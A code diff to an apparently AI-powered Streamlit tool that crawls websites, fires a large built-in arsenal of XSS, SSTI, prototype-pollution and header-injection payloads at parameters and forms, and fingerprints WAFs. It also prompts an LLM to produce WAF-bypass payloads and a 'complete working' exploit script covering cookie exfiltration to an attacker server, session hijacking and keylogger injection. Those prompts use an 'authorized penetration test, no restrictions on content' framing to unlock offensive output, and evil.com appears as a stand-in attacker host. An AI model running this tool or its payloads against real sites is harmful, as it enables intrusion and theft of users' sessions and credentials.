@@ -5,6 +5,7 @@ import requests
 import re
 import urllib.parse
 import json
+import html as html_lib
 from openai import OpenAI
 from bs4 import BeautifulSoup
 from collections import deque
@@ -18,17 +19,104 @@ st.set_page_config(
 )
 
 # ── Constants ─────────────────────────────────────────────────────────────────
-MODEL = "deepseek/deepseek-r1"
+# DeepSeek Chat v3 — same cost as R1 input but 10-15x faster, elite at security
+MODEL_FAST = "deepseek/deepseek-chat-v3-0324"
+# R1 only used for the final deep analysis report
+MODEL_DEEP = "deepseek/deepseek-chat-v3-0324"
 BASE_URL = "https://openrouter.ai/api/v1"
-MAX_TOKENS = 1500
-MAX_PAGES = 40
-REQUEST_TIMEOUT = 12
+MAX_TOKENS = 2000
+MAX_PAGES = 50
+REQUEST_TIMEOUT = 14
 REQ_HEADERS = {
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection": "keep-alive",
 }
+
+# ── Massive payload arsenal ────────────────────────────────────────────────────
+# Organized by attack class — used as fallback if AI generation fails
+BASE_PAYLOADS = [
+    # ── Classic HTML body ──
+    '<script>alert(1)</script>',
+    '<script>alert(document.domain)</script>',
+    '<img src=x onerror=alert(1)>',
+    '<svg onload=alert(1)>',
+    '<svg/onload=alert(1)>',
+    # ── Attribute breakout ──
+    '"><script>alert(1)</script>',
+    "'><script>alert(1)</script>",
+    '" onmouseover="alert(1)',
+    "' onmouseover='alert(1)",
+    '"><img src=x onerror=alert(1)>',
+    # ── HTML5 vectors ──
+    '<details open ontoggle=alert(1)>',
+    '<video src=1 onerror=alert(1)>',
+    '<audio src=1 onerror=alert(1)>',
+    '<body onpageshow=alert(1)>',
+    '<input autofocus onfocus=alert(1)>',
+    '<select autofocus onfocus=alert(1)>',
+    '<textarea autofocus onfocus=alert(1)>',
+    '<keygen autofocus onfocus=alert(1)>',
+    '<math><mtext></mtext><mglyph><svg><mtext></mtext><texter onload=alert(1)></texter></svg></mglyph></math>',
+    # ── JS context escape ──
+    '";alert(1)//',
+    "';alert(1)//",
+    '\';alert(1)//',
+    '</script><script>alert(1)</script>',
+    '`-alert(1)-`',
+    # ── Polyglots ──
+    'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
+    '\\"onmouseover=alert(1)//',
+    '-->"><svg/onload=alert(1)><!--',
+    # ── Encoding variants ──
+    '%3Cscript%3Ealert(1)%3C/script%3E',
+    '&lt;script&gt;alert(1)&lt;/script&gt;',
+    '<scr\x00ipt>alert(1)</scr\x00ipt>',
+    '<IMG SRC=x onERRor=alert(1)>',
+    '<SCRIPT>alert(1)</SCRIPT>',
+    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
+    '\u003cscript\u003ealert(1)\u003c/script\u003e',
+    # ── mXSS / Mutation XSS ──
+    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+    '<listing><img src="</listing><img src=x onerror=alert(1)>">',
+    '<!--<img src="--><img src=x onerror=alert(1)>',
+    '<xss id=x tabindex=1 onfocus=alert(1)></xss>',
+    # ── CSP bypass attempts ──
+    '<link rel=import href=data:text/html,<script>alert(1)</script>>',
+    '<base href=//evil.com/>',
+    '<object data=javascript:alert(1)>',
+    '<embed src=javascript:alert(1)>',
+    # ── DOM clobbering ──
+    '<form id=x><input id=y name=action value=javascript:alert(1)>',
+    '<a id=defaultView href=javascript:alert(1)>click',
+    # ── Prototype pollution probe ──
+    '__proto__[xss]=1',
+    'constructor[prototype][xss]=1',
+    '{"__proto__":{"xss":1}}',
+    # ── SSTI probes ──
+    '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}',
+    '{{config.items()}}', '{{request.environ}}',
+    # ── HTML injection (no JS) ──
+    '<h1>INJECTED</h1>',
+    '<marquee>OWNED</marquee>',
+    '<iframe src=https://evil.com>',
+    '</td><td>INJECTED</td><td>',
+    # ── URL / href context ──
+    'javascript:alert(1)',
+    'javascript:alert(document.cookie)',
+    'data:text/html,<script>alert(1)</script>',
+    # ── DOM hash XSS ──
+    '#"><img src=x onerror=alert(1)>',
+    '#javascript:alert(1)',
+    # ── JSON injection ──
+    '"},"xss":"<script>alert(1)</script>',
+    # ── Header injection ──
+    'Value\r\nX-Injected: yes',
+    'Value\r\nSet-Cookie: xss=1',
+]
 
 DOM_SINKS = [
     r"innerHTML\s*[+=]", r"outerHTML\s*[+=]", r"document\.write\s*\(",
@@ -37,6 +125,9 @@ DOM_SINKS = [
     r"new\s+Function\s*\(", r"location\.href\s*=", r"location\.assign\s*\(",
     r"location\.replace\s*\(", r"dangerouslySetInnerHTML", r"v-html\s*=",
     r"\.html\s*\(", r"\.append\s*\(", r"\$\(.*\)\.html",
+    r"document\.URL", r"document\.location", r"window\.location",
+    r"document\.referrer", r"location\.hash", r"location\.search",
+    r"__proto__", r"prototype\[", r"\.srcdoc\s*=",
 ]
 
 TEMPLATE_ENGINES = {
@@ -49,24 +140,23 @@ TEMPLATE_ENGINES = {
     "nunjucks": [r"nunjucks", r"{% for"],
     "freemarker": [r"freemarker", r"<#if"],
     "thymeleaf": [r"th:text", r"th:utext"],
+    "pug": [r"pug\.compile", r"\.pug$"],
+    "velocity": [r"#set\s*\(", r"#foreach"],
 }
 
-SSTI_PAYLOADS = [
-    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
-    "{{config}}", "{{request.environ}}",
-    "{php}echo 'ssti';{/php}", "{% debug %}",
-]
-
 WAF_SIGNATURES = {
-    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
-    "AWS WAF": ["awswaf", "x-amzn-requestid"],
-    "ModSecurity": ["mod_security", "modsecurity"],
-    "Akamai": ["akamai", "ak_bmsc"],
-    "Sucuri": ["sucuri", "x-sucuri-id"],
-    "Imperva": ["imperva", "incapsula"],
-    "Wordfence": ["wordfence"],
-    "F5 BIG-IP": ["bigipserver", "ts="],
-    "Barracuda": ["barracuda_"],
+    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf_clearance"],
+    "AWS WAF": ["awswaf", "x-amzn-requestid", "x-amzn-trace-id"],
+    "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
+    "Akamai": ["akamai", "ak_bmsc", "bm_sz"],
+    "Sucuri": ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
+    "Imperva": ["imperva", "incapsula", "visid_incap"],
+    "Wordfence": ["wordfence", "wfvt_"],
+    "F5 BIG-IP": ["bigipserver", "ts=", "F5_"],
+    "Barracuda": ["barracuda_", "barra_counter_session"],
+    "Fortinet": ["fortigate", "fortiwaf", "FORTIWAFSID"],
+    "Reblaze": ["rbzid", "rbzsessionid"],
+    "PerimeterX": ["_pxde", "_pxvid", "pxcts"],
 }
 
 # ── Session state ─────────────────────────────────────────────────────────────
@@ -74,7 +164,8 @@ defaults = {
     "log": [], "findings": [], "running": False, "done": False,
     "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
     "exploit_code": "", "report": "", "dom_sinks": [],
-    "waf_detected": "", "_last_target": "", "_last_payload": "", "_last_depth": 2,
+    "waf_detected": "", "_last_target": "", "_last_payload": "",
+    "_last_depth": 2, "_last_blind_url": "",
 }
 for k, v in defaults.items():
     if k not in st.session_state:
@@ -90,14 +181,18 @@ def get_client():
 
 
 # ── Live log helpers ──────────────────────────────────────────────────────────
-ICONS = {"info": "▸", "ok": "✅", "warn": "⚠️",
-         "vuln": "🚨", "ai": "🤖", "cmd": "⚙️", "dom": "🔬"}
+ICONS = {
+    "info": "▸", "ok": "✅", "warn": "⚠️",
+    "vuln": "🚨", "ai": "🤖", "cmd": "⚙️", "dom": "🔬",
+    "skip": "⏭️", "blind": "👁️",
+}
+
 
 def _render_terminal():
     text = "\n".join(st.session_state.log) if st.session_state.log else "Ready."
-    # escape HTML special chars so the green terminal renders correctly
     safe = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
     return f'<div class="terminal">{safe}</div>'
+
 
 def log(msg: str, kind: str = "info", term_ph=None, stats_phs=None):
     ts = datetime.now().strftime("%H:%M:%S")
@@ -107,6 +202,7 @@ def log(msg: str, kind: str = "info", term_ph=None, stats_phs=None):
         term_ph.markdown(_render_terminal(), unsafe_allow_html=True)
     if stats_phs is not None:
         _render_stats(*stats_phs)
+
 
 def _render_stats(s1, s2, s3, s4, s5):
     s1.metric("Pages", st.session_state.pages_crawled)
@@ -159,6 +255,37 @@ def detect_waf(resp) -> str:
     return ""
 
 
+# ── JS source / API endpoint discovery ───────────────────────────────────────
+def _extract_js_endpoints(html: str, base_url: str) -> list:
+    endpoints = []
+    # Find fetch/axios/XHR calls and API routes in inline JS
+    patterns = [
+        r'fetch\([\'"]([^\'"?#]+)[\'"]',
+        r'axios\.\w+\([\'"]([^\'"?#]+)[\'"]',
+        r'\.open\([\'"](?:GET|POST)[\'"],\s*[\'"]([^\'"]+)[\'"]',
+        r'url\s*[:=]\s*[\'"]([/][^\'"]+)[\'"]',
+        r'endpoint\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
+        r'api[Uu]rl\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
+        r'[\'"](/api/[^\'"]+)[\'"]',
+        r'[\'"](/v\d+/[^\'"]+)[\'"]',
+    ]
+    for pat in patterns:
+        for m in re.findall(pat, html):
+            abs_url = to_abs(base_url, m)
+            if abs_url and abs_url not in endpoints:
+                endpoints.append(abs_url)
+    return endpoints[:20]
+
+
+def _find_json_params(html: str, url: str) -> list:
+    params = []
+    # Look for JSON bodies, GraphQL, hidden inputs with JSON
+    for m in re.findall(r'"(\w+)"\s*:\s*"[^"]*"', html):
+        if m not in params and len(m) < 30:
+            params.append(m)
+    return params[:10]
+
+
 # ── Crawler ───────────────────────────────────────────────────────────────────
 def crawl(target: str, max_depth: int, term_ph, stats_phs) -> list:
     visited, bfsq, pages = set(), deque([(target, 0)]), []
@@ -178,15 +305,18 @@ def crawl(target: str, max_depth: int, term_ph, stats_phs) -> list:
         forms = _extract_forms(url, soup)
         params = _extract_params(url)
         dom_hits = _find_dom_sinks(resp.text)
+        js_endpoints = _extract_js_endpoints(resp.text, url)
         pages.append({
-            "url": url, "html": resp.text[:14000], "status": resp.status_code,
+            "url": url, "html": resp.text[:18000], "status": resp.status_code,
             "headers": dict(resp.headers), "forms": forms,
             "params": params, "dom_sinks": dom_hits,
             "inline_js": _inline_js(soup),
+            "js_endpoints": js_endpoints,
         })
         st.session_state.pages_crawled = len(pages)
         log(f"Crawled [{len(pages)}] {url} — {len(forms)} forms / "
-            f"{len(params)} params / {len(dom_hits)} DOM sinks",
+            f"{len(params)} params / {len(dom_hits)} DOM sinks / "
+            f"{len(js_endpoints)} JS endpoints",
             "cmd", term_ph, stats_phs)
         if depth < max_depth:
             for tag in soup.find_all("a", href=True):
@@ -201,6 +331,12 @@ def crawl(target: str, max_depth: int, term_ph, stats_phs) -> list:
                     nn = nxt.split("#")[0].rstrip("/")
                     if nn not in visited:
                         bfsq.append((nxt, depth + 1))
+            # Also queue discovered JS API endpoints
+            for ep in js_endpoints[:5]:
+                if same_origin(target, ep):
+                    nn = ep.split("#")[0].rstrip("/")
+                    if nn not in visited:
+                        bfsq.append((ep, depth + 1))
     return pages
 
 
@@ -215,9 +351,11 @@ def _extract_forms(page_url: str, soup) -> list:
             name = inp.get("name") or inp.get("id") or ""
             itype = inp.get("type", "text")
             if name and itype not in ("submit", "button", "image", "file"):
-                fields.append({"name": name, "type": itype})
+                fields.append({"name": name, "type": itype,
+                                "value": inp.get("value", "")})
         if fields:
-            forms.append({"action": action_url, "method": method, "fields": fields})
+            forms.append({"action": action_url, "method": method,
+                           "fields": fields, "enctype": form.get("enctype", "")})
     return forms
 
 
@@ -229,16 +367,16 @@ def _inline_js(soup) -> str:
     parts = []
     for tag in soup.find_all("script"):
         if not tag.get("src") and tag.string:
-            parts.append(tag.string[:400])
-    return "\n".join(parts[:8])
+            parts.append(tag.string[:600])
+    return "\n".join(parts[:10])
 
 
 def _find_dom_sinks(html: str) -> list:
     found = []
     for pat in DOM_SINKS:
-        for m in re.findall(f".{{0,50}}{pat}.{{0,60}}", html)[:2]:
+        for m in re.findall(f".{{0,60}}{pat}.{{0,80}}", html)[:3]:
             found.append(m.strip())
-    return found[:15]
+    return list(dict.fromkeys(found))[:20]
 
 
 def _detect_template_engine(pages: list) -> tuple:
@@ -246,130 +384,114 @@ def _detect_template_engine(pages: list) -> tuple:
     for engine, sigs in TEMPLATE_ENGINES.items():
         for sig in sigs:
             if re.search(sig, combined, re.IGNORECASE):
-                return engine, SSTI_PAYLOADS
+                ssti = [
+                    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
+                    "{{config.items()}}", "{{request.environ}}",
+                    "{% for i in range(7) %}{{i}}{% endfor %}",
+                    "{{''.__class__.__mro__[1].__subclasses__()}}",
+                    "{php}echo 'ssti_hit';{/php}", "{% debug %}",
+                ]
+                return engine, ssti
     return "", []
 
 
 def _analyze_headers(headers: dict) -> list:
     issues = []
-    hkeys = {k.lower() for k in headers}
+    hkeys = {k.lower(): v for k, v in headers.items()}
     for h, msg in [
         ("content-security-policy", "No CSP — inline scripts unrestricted"),
-        ("x-xss-protection", "No X-XSS-Protection"),
-        ("x-content-type-options", "No X-Content-Type-Options"),
-        ("x-frame-options", "No X-Frame-Options"),
+        ("x-xss-protection", "No X-XSS-Protection header"),
+        ("x-content-type-options", "No X-Content-Type-Options — MIME sniffing risk"),
+        ("x-frame-options", "No X-Frame-Options — clickjacking risk"),
+        ("strict-transport-security", "No HSTS"),
+        ("permissions-policy", "No Permissions-Policy"),
     ]:
         if h not in hkeys:
             issues.append(msg)
-    csp = next((v for k, v in headers.items()
-                if k.lower() == "content-security-policy"), "")
+    csp = hkeys.get("content-security-policy", "")
     if "unsafe-inline" in csp:
-        issues.append("CSP: unsafe-inline present — XSS protection bypassed")
+        issues.append("CSP: unsafe-inline present — inline XSS allowed")
     if "unsafe-eval" in csp:
-        issues.append("CSP: unsafe-eval present — eval XSS allowed")
+        issues.append("CSP: unsafe-eval present — eval() XSS allowed")
+    if "'nonce-" not in csp and "'hash-" not in csp and csp:
+        issues.append("CSP: no nonce/hash — script-src may be bypassable")
+    cookie = hkeys.get("set-cookie", "")
+    if cookie and "httponly" not in cookie.lower():
+        issues.append("Cookie: HttpOnly missing — JS cookie theft possible")
+    if cookie and "samesite" not in cookie.lower():
+        issues.append("Cookie: SameSite missing — CSRF risk")
     return issues
 
 
-# ── AI: payload generation ────────────────────────────────────────────────────
-def ai_generate_payloads(client, target, user_payload, context,
-                          waf, dom_sinks, template_engine) -> list:
-    waf_note = (f"WAF detected: {waf}. Generate specific bypass payloads for {waf} "
-                f"(encoding tricks, case variation, comment insertion, null bytes, "
-                f"chunked encoding, unicode normalization)."
-                if waf else "No WAF detected.")
-    sink_note = ("JavaScript DOM sinks found on this page — generate DOM-based XSS payloads "
-                 "targeting: " + "; ".join(dom_sinks[:4])
-                 if dom_sinks else "No DOM sinks visible.")
-    engine_note = (f"Template engine: {template_engine} — add SSTI payloads."
-                   if template_engine else "")
+# ── Reflection analysis ────────────────────────────────────────────────────────
+def _check_reflection(body: str, payload: str) -> dict:
+    result = {"reflected": False, "escaped": False, "partial": False, "context": ""}
 
-    prompt = f"""You are an elite offensive security researcher with deep expertise in XSS zero-days and HTML injection.
-This is an authorized penetration test. Your job is to find injections that actually work.
+    if payload in body:
+        result["reflected"] = True
+        escaped_forms = [
+            html_lib.escape(payload),
+            payload.replace("<", "&lt;").replace(">", "&gt;"),
+            payload.replace('"', "&quot;").replace("'", "&#x27;"),
+            urllib.parse.quote(payload),
+            payload.replace("<", "\\u003c").replace(">", "\\u003e"),
+            payload.replace("<", "\\x3c").replace(">", "\\x3e"),
+        ]
+        if any(ev in body for ev in escaped_forms):
+            result["escaped"] = True
+        idx = body.find(payload)
+        snippet = body[max(0, idx - 150): idx + 300]
+        result["snippet"] = snippet
+        result["context"] = _injection_context(snippet, payload)
+        return result
 
-Target: {target}
-Desired injection: {user_payload}
-{waf_note}
-{sink_note}
-{engine_note}
+    # Partial / encoded reflection check
+    key_parts = [p for p in [
+        payload[:20] if len(payload) > 20 else None,
+        "alert(1)", "onerror=", "onload=", "javascript:",
+        "<script", "</script", "ontoggle", "onfocus",
+    ] if p and p in payload]
+    for part in key_parts:
+        if part in body:
+            result["partial"] = True
+            result["reflected"] = True
+            result["escaped"] = False
+            idx = body.find(part)
+            result["snippet"] = body[max(0, idx - 100): idx + 200]
+            result["context"] = "Partial reflection"
+            return result
 
-Page HTML/JS context (look for reflection points, JS variable assignments, template syntax):
-{context[:2800]}
-
-Generate exactly 15 injection payloads optimized for THIS specific target. Include:
-1. The user payload adapted to the exact HTML context you see
-2. Attribute context breakouts (close quotes, inject event handlers)
-3. JS context injections (close strings/statements, inject code)
-4. Polyglots that work across HTML/JS/CSS contexts
-5. HTML5 vectors: <details ontoggle>, <video onerror>, <svg onload>, <math> XSS
-6. Mutation XSS exploiting browser parser quirks
-7. Encoded variants (HTML entities, URL encode, unicode escapes, double encode)
-8. WAF bypass variants if WAF detected
-9. DOM XSS via hash/search params if DOM sinks are present
-10. SSTI probes if template engine detected
-
-Output ONLY a raw JSON array of strings. No markdown, no explanation."""
-
-    try:
-        resp = client.chat.completions.create(
-            model=MODEL,
-            messages=[{"role": "user", "content": prompt}],
-            max_tokens=900,
-            temperature=0.6,
-        )
-        text = resp.choices[0].message.content.strip()
-        text = re.sub(r"```[a-z]*\n?|```", "", text).strip()
-        m = re.search(r"\[.*\]", text, re.DOTALL)
-        if m:
-            parsed = json.loads(m.group())
-            if isinstance(parsed, list) and parsed:
-                return [str(p) for p in parsed]
-    except Exception as e:
-        pass  # fall through to defaults
-
-    base = [
-        user_payload,
-        '<script>alert("XSS")</script>',
-        '"><script>alert(1)</script>',
-        "'><img src=x onerror=alert(1)>",
-        '<svg/onload=alert(1)>',
-        '<details open ontoggle=alert(1)>',
-        '<video src=1 onerror=alert(1)>',
-        '"><body onload=alert(1)>',
-        'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
-        '";alert(1)//',
-        '<iframe srcdoc="<script>alert(1)</script>">',
-        '<math><mtext></mtext></math><script>alert(1)</script>',
-        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
-        '{{7*7}}', '${7*7}',
-    ]
-    if dom_sinks:
-        base.append('#"><img src=x onerror=alert(1)>')
-    return base
+    return result
 
 
-# ── Injection testing ─────────────────────────────────────────────────────────
 def _injection_context(snippet: str, payload: str) -> str:
-    before = snippet[:snippet.find(payload)] if payload in snippet else snippet[:60]
+    before = snippet[:snippet.find(payload)] if payload in snippet else snippet[:80]
     if re.search(r'<script[^>]*>[^<]*$', before, re.DOTALL):
         return "JS context (inside <script>)"
     if re.search(r'on\w+\s*=\s*["\'][^"\']*$', before):
         return "Event handler attribute"
-    if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*$', before):
-        return "URL attribute"
+    if re.search(r'(href|src|action|data)\s*=\s*["\'][^"\']*$', before):
+        return "URL attribute (href/src)"
     if re.search(r'<style[^>]*>[^<]*$', before, re.DOTALL):
         return "CSS context"
     if re.search(r'=\s*["\'][^"\']*$', before):
         return "HTML attribute value"
     if re.search(r'<[a-zA-Z][^>]*$', before):
-        return "HTML tag (attribute injection)"
+        return "Inside HTML tag (attr injection)"
+    if re.search(r'//.*$', before):
+        return "JS comment context"
     return "HTML body"
 
 
-def test_one(url: str, param: str, payload: str, method: str = "get") -> dict:
-    r = {"url": url, "param": param, "payload": payload,
-         "method": method, "status": None,
-         "reflected": False, "escaped": False,
-         "context": "", "body_snippet": ""}
+# ── Injection testing ─────────────────────────────────────────────────────────
+def test_one(url: str, param: str, payload: str, method: str = "get",
+             extra_data: dict = None) -> dict:
+    r = {
+        "url": url, "param": param, "payload": payload,
+        "method": method, "status": None,
+        "reflected": False, "escaped": False, "partial": False,
+        "context": "", "body_snippet": "",
+    }
     try:
         if method == "get":
             parsed = urllib.parse.urlparse(url)
@@ -380,65 +502,200 @@ def test_one(url: str, param: str, payload: str, method: str = "get") -> dict:
             resp = requests.get(test_url, headers=REQ_HEADERS,
                                 timeout=REQUEST_TIMEOUT, allow_redirects=True)
         else:
-            resp = requests.post(url, data={param: payload},
-                                 headers=REQ_HEADERS,
+            data = dict(extra_data or {})
+            data[param] = payload
+            resp = requests.post(url, data=data, headers=REQ_HEADERS,
                                  timeout=REQUEST_TIMEOUT, allow_redirects=True)
         r["status"] = resp.status_code
-        body = resp.text
-        if payload in body:
-            r["reflected"] = True
-            escaped_forms = [
-                payload.replace("<", "&lt;").replace(">", "&gt;"),
-                payload.replace('"', "&quot;").replace("'", "&#x27;"),
-                urllib.parse.quote(payload),
-                payload.replace("<", "\\u003c").replace(">", "\\u003e"),
-            ]
-            if any(ev in body for ev in escaped_forms):
-                r["escaped"] = True
-            idx = body.find(payload)
-            snippet = body[max(0, idx - 120): idx + 250]
-            r["body_snippet"] = snippet
-            r["context"] = _injection_context(snippet, payload)
+        ref = _check_reflection(resp.text, payload)
+        r["reflected"] = ref["reflected"]
+        r["escaped"] = ref.get("escaped", False)
+        r["partial"] = ref.get("partial", False)
+        r["body_snippet"] = ref.get("snippet", "")
+        r["context"] = ref.get("context", "")
     except Exception as e:
         r["error"] = str(e)
     return r
 
 
+def _test_header_injection(url: str) -> list:
+    """Test for HTTP header injection via common headers."""
+    hits = []
+    probe = "XSS-PROBE-9182"
+    inject_headers = {
+        "X-Forwarded-For": f"{probe}",
+        "X-Real-IP": f"{probe}",
+        "Referer": f"https://evil.com/{probe}",
+        "X-Custom-Header": f'<script>alert("{probe}")</script>',
+    }
+    for hname, hval in inject_headers.items():
+        try:
+            h = dict(REQ_HEADERS)
+            h[hname] = hval
+            resp = requests.get(url, headers=h, timeout=REQUEST_TIMEOUT)
+            if probe in resp.text:
+                hits.append({
+                    "url": url, "param": hname, "payload": hval,
+                    "method": "header", "status": resp.status_code,
+                    "reflected": True, "escaped": False, "partial": False,
+                    "context": f"HTTP Header ({hname})",
+                    "body_snippet": resp.text[resp.text.find(probe)-50:resp.text.find(probe)+100],
+                })
+        except Exception:
+            pass
+    return hits
+
+
 def test_page(page: dict, payloads: list, term_ph, stats_phs) -> list:
     hits = []
+    # URL params
     for param in page.get("params", []):
-        for payload in payloads[:10]:
+        st.session_state.points_found += 1
+        for payload in payloads[:15]:
             r = test_one(page["url"], param, payload, "get")
             if r["reflected"] and not r["escaped"]:
                 hits.append(r)
                 st.session_state.vulns_found += 1
-                log(f"VULN [{r['context']}] {page['url']} ?{param}",
+                log(f"VULN [{r['context']}] {page['url']} ?{param}= [{payload[:50]}]",
                     "vuln", term_ph, stats_phs)
+                break
+            elif r["reflected"] and r.get("partial"):
+                log(f"Partial reflection — {page['url']} param={param} [{payload[:40]}]",
+                    "warn", term_ph, stats_phs)
                 break
             elif r["reflected"]:
                 log(f"Escaped reflection — {page['url']} param={param}",
                     "warn", term_ph, stats_phs)
                 break
+
+    # Forms
     for form in page.get("forms", []):
+        field_data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
         for field in form.get("fields", []):
-            for payload in payloads[:10]:
-                r = test_one(form["action"], field["name"], payload, form["method"])
+            st.session_state.points_found += 1
+            for payload in payloads[:15]:
+                data = dict(field_data)
+                data[field["name"]] = payload
+                r = test_one(form["action"], field["name"], payload,
+                             form["method"], extra_data=data)
                 if r["reflected"] and not r["escaped"]:
                     hits.append(r)
                     st.session_state.vulns_found += 1
                     log(f"VULN [{r['context']}] form={form['action']} "
-                        f"field={field['name']}", "vuln", term_ph, stats_phs)
+                        f"field={field['name']} [{payload[:50]}]",
+                        "vuln", term_ph, stats_phs)
+                    break
+                elif r["reflected"]:
+                    log(f"Escaped reflection — form={form['action']} field={field['name']}",
+                        "warn", term_ph, stats_phs)
                     break
     return hits
 
 
-# ── AI: exploit + report ──────────────────────────────────────────────────────
-def ai_write_exploit(client, findings: list, target: str) -> str:
+# ── AI: context-aware payload generation ─────────────────────────────────────
+def ai_generate_payloads(client, target, user_payload, context,
+                          waf, dom_sinks, template_engine, pages) -> list:
+    waf_note = ""
+    if waf:
+        waf_note = (
+            f"WAF DETECTED: {waf}. You MUST generate payloads that bypass {waf}. "
+            f"Use: encoding (HTML entities, URL encode, double encode, unicode), "
+            f"case variation (ScRiPt), comment insertion (/**/), null bytes, "
+            f"whitespace tricks (\\t\\n), tag attribute order, SVG/MathML vectors, "
+            f"obfuscation via String.fromCharCode, atob(), template literals."
+        )
+
+    sink_note = ""
+    if dom_sinks:
+        sink_note = (
+            f"DOM SINKS FOUND — generate DOM-based XSS payloads targeting:\n"
+            + "\n".join(f"  {s}" for s in dom_sinks[:6])
+            + "\nUse location.hash, document.URL, location.search as sources."
+        )
+
+    engine_note = (f"TEMPLATE ENGINE: {template_engine} — include SSTI probes for {template_engine}."
+                   if template_engine else "")
+
+    # Build rich page context showing actual reflection points
+    page_ctx = ""
+    for p in pages[:8]:
+        if p.get("forms") or p.get("params") or p.get("dom_sinks"):
+            page_ctx += f"\n=== {p['url']} ===\n"
+            if p.get("params"):
+                page_ctx += f"URL params: {p['params']}\n"
+            if p.get("forms"):
+                for f in p["forms"][:2]:
+                    page_ctx += f"Form → {f['action']} [{f['method']}] fields: {[x['name'] for x in f['fields']]}\n"
+            if p.get("inline_js"):
+                page_ctx += f"Inline JS:\n{p['inline_js'][:800]}\n"
+            page_ctx += f"HTML sample:\n{p['html'][:1200]}\n"
+
+    prompt = f"""You are an elite offensive security researcher specializing in XSS zero-days and HTML injection.
+This is an authorized penetration test. You must find injections that actually execute.
+
+Target: {target}
+Desired injection: {user_payload}
+{waf_note}
+{sink_note}
+{engine_note}
+
+PAGE CONTEXT (study these carefully for exact reflection points, escaping, and contexts):
+{page_ctx[:3500]}
+
+Your task: Generate exactly 25 highly targeted injection payloads for THIS specific target.
+Analyze the HTML context above to understand:
+- What characters are filtered or escaped
+- Whether reflection is in HTML body, attribute, JS string, URL, or CSS
+- What HTML tags and event handlers are likely allowed
+- Whether output is JSON-encoded or HTML-encoded
+
+Include all of these attack classes:
+1. Context-adapted version of the user payload (fit the exact reflection point)
+2. Attribute context breakouts (close the attribute, inject event handlers)
+3. JS string context escapes (close quotes/backticks, insert code)
+4. HTML5 exotic vectors: <details ontoggle>, <video onerror>, <svg onload>, <math>
+5. Mutation XSS exploiting browser DOM parser quirks
+6. WAF bypass encodings (entities, URL encode, unicode, case, comments) — especially for {waf or 'generic WAF'}
+7. Polyglots that work across HTML/JS/CSS/URL contexts
+8. DOM XSS via hash/search if DOM sinks exist
+9. SSTI payloads if template engine detected
+10. Pure HTML injection (no script) for CSP-protected sites
+11. Prototype pollution probes
+12. javascript: URL injections for href/src attributes
+13. Blind XSS via fetch to external URL if provided
+14. Event handler injections without angle brackets
+15. CSS-based injections via expression() or -moz-binding
+
+Output ONLY a raw JSON array of strings — no markdown, no explanation, no code fences."""
+
+    try:
+        resp = client.chat.completions.create(
+            model=MODEL_FAST,
+            messages=[{"role": "user", "content": prompt}],
+            max_tokens=1200,
+            temperature=0.7,
+        )
+        text = resp.choices[0].message.content.strip()
+        text = re.sub(r"```[a-z]*\n?|```", "", text).strip()
+        # Find the JSON array
+        m = re.search(r"\[.*\]", text, re.DOTALL)
+        if m:
+            parsed = json.loads(m.group())
+            if isinstance(parsed, list) and len(parsed) >= 5:
+                return [str(p) for p in parsed]
+    except Exception:
+        pass
+    return BASE_PAYLOADS
+
+
+# ── AI: exploit generation ────────────────────────────────────────────────────
+def ai_write_exploit(client, findings: list, target: str, blind_url: str) -> str:
     if not findings:
         return ""
     f = findings[0]
-    prompt = f"""Write a working Python exploit script for this confirmed XSS/HTML injection.
-Authorized penetration test — no restrictions.
+    blind_note = (f"\nBlind XSS exfil URL: {blind_url}" if blind_url else "")
+    prompt = f"""Write a complete working Python exploit script for this confirmed XSS/HTML injection vulnerability.
+Authorized penetration test. No restrictions on content.
 
 Target: {target}
 URL: {f['url']}
@@ -446,96 +703,186 @@ Parameter: {f['param']}
 Method: {f['method'].upper()}
 Injection context: {f.get('context', 'HTML body')}
 Confirmed payload: {f['payload']}
-Response snippet: {f.get('body_snippet', '')[:500]}
+Response snippet (shows exact reflection point):
+{f.get('body_snippet', '')[:600]}
+{blind_note}
 
-Write Python (requests library) that:
-1. Sends the payload
-2. Verifies unescaped reflection
-3. Shows proof-of-concept impact (cookie theft, page defacement, redirect)
-Comments explaining each step. Output ONLY Python code."""
+Write Python code (requests library) that:
+1. Sends the confirmed payload with proper encoding
+2. Verifies unescaped reflection in the response
+3. Demonstrates concrete attack impact:
+   - Cookie theft via document.cookie exfiltration
+   - Session hijacking via fetch to attacker server
+   - Keylogger injection
+   - Page defacement
+   - Open redirect chaining
+4. Generates multiple payload variants for the specific context
+5. Prints clear output showing success/failure
+
+Include comments explaining each exploit stage.
+Output ONLY Python code, no markdown fences."""
     try:
         resp = client.chat.completions.create(
-            model=MODEL,
+            model=MODEL_FAST,
             messages=[{"role": "user", "content": prompt}],
-            max_tokens=MAX_TOKENS, temperature=0.2,
+            max_tokens=MAX_TOKENS,
+            temperature=0.1,
         )
         code = resp.choices[0].message.content.strip()
         return re.sub(r"```python\n?|```", "", code).strip()
     except Exception as e:
-        return f"# Error: {e}"
+        return f"# Error generating exploit: {e}"
 
 
+# ── AI: deep security report ──────────────────────────────────────────────────
 def ai_full_report(client, findings: list, pages: list,
-                   target: str, dom_sinks: list, waf: str) -> str:
